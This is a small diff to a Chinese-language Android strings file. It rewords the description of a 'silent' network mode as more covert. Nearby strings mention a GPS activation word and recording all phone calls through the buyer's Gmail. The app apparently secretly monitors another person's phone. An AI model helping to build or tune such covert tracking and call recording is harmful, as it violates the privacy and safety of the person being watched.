@@ -94,7 +94,7 @@
     <string name="pref_gps_activate_word_max_len">最大长度不能超过12个汉字或24个英数字符。</string>
     <string name="pref_category_network_mode_title">网络连接</string>
     <string name="pref_network_mode_title">网络连接模式</string>
-    <string name="pref_network_mode_summary">推荐使用默认的静默模式，更加隐蔽。</string>
+    <string name="pref_network_mode_summary">静默模式更加隐蔽，如果该手机用户有用手机上网的习惯请选择静默模式。</string>
     <string name="pref_network_mode_dlg_title">选择模式</string>
     <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用自己的GMail发信，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
     
